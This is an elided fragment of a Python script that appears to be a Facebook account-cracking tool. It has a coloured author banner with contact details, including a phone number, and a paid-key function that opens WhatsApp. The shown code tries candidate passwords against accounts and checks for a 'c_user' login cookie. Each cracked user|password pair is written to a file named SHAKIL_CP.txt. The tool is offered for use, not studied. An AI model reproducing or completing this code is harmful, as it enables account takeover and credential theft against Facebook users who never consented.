...
\033[0;93m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[0;91mAUTHOR   : Shakil
 
\033[0;93mFACEBOOK : smshakilsarkar696969smsm
 
\033[0;96mGITHUB   : Smshakilsarkar   ......  WhatsApp : 01750633432
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s[SHAKIL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SHAKIL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
...
def bnsbuy():
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/01750633432?text=' + tks)
